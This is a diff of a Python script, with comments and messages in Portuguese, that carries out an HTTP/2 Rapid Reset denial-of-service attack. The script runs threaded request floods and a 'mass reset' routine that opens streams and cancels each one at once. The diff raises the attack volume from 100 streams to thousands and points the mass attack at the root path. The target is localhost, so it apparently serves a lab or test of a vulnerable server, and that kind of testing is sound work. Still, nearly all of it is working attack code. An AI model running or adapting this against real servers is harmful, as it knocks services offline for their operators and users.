@@ -11,7 +11,7 @@ logger = logging.getLogger(__name__)
 HOST = '127.0.0.1'  
 PORT = 8443
 NUM_THREADS = 8
-RESETS_PER_THREAD = 1000
+RESETS_PER_THREAD = 5000
 
 def exploit_vulnerable_endpoint(thread_id):
     try:
@@ -33,7 +33,7 @@ def exploit_vulnerable_endpoint(thread_id):
 
         successful_attacks = 0
         
-        endpoints = ['/vulnerable', '/slow', '/medium', '/fast']   
+        endpoints = ['/vulnerable', '/slow', '/medium']   
 
         for i in range(RESETS_PER_THREAD):
             endpoint = endpoints[i % len(endpoints)]
@@ -103,7 +103,7 @@ def mass_reset_attack():
         time.sleep(0.1)
 
         stream_ids = []
-        for i in range(100):  
+        for i in range(5*RESETS_PER_THREAD):  
             stream_id = (9999 + i) * 2 + 1
             stream_ids.append(stream_id)
             
@@ -111,23 +111,17 @@ def mass_reset_attack():
                 (':method', 'GET'),
                 (':authority', f'{HOST}:{PORT}'),
                 (':scheme', 'https'),
-                (':path', f'/vulnerable?mass-attack=true&req={i}'),
+                (':path', f'/?mass-attack=true&req={i}'),
                 ('user-agent', 'HTTP2-Mass-Reset-Attack/1.0'),
             ]
             
             h2_conn.send_headers(stream_id, headers, end_stream=False)
             conn.sendall(h2_conn.data_to_send())
-        
-        logger.info("MassAttack: 100 requisições enviadas, aguardando processamento...")
-        
-        time.sleep(0.2)
-        
-        for stream_id in stream_ids:
+            time.sleep(0.05)
             h2_conn.reset_stream(stream_id)
             conn.sendall(h2_conn.data_to_send())
         
-        logger.info("MassAttack: Reset em massa enviado!")
-        
+        logger.info(f"MassAttack: {5*RESETS_PER_THREAD} requisições enviadas, aguardando processamento...")
         conn.close()
         
     except Exception as e:
@@ -162,7 +156,7 @@ def run_attack():
     print("\n ====>  ATAQUE CONCLUÍDO: <====")
     print(f"   Duração: {duration:.2f} segundos")
     print(f"   Threads: {NUM_THREADS + 1} (incluindo mass attack)")
-    print(f"   Ataques enviados: ~{NUM_THREADS * RESETS_PER_THREAD + 100}")
+    print(f"   Ataques enviados: ~{NUM_THREADS * RESETS_PER_THREAD + 5 * RESETS_PER_THREAD}")
     
     print("="*10)
 
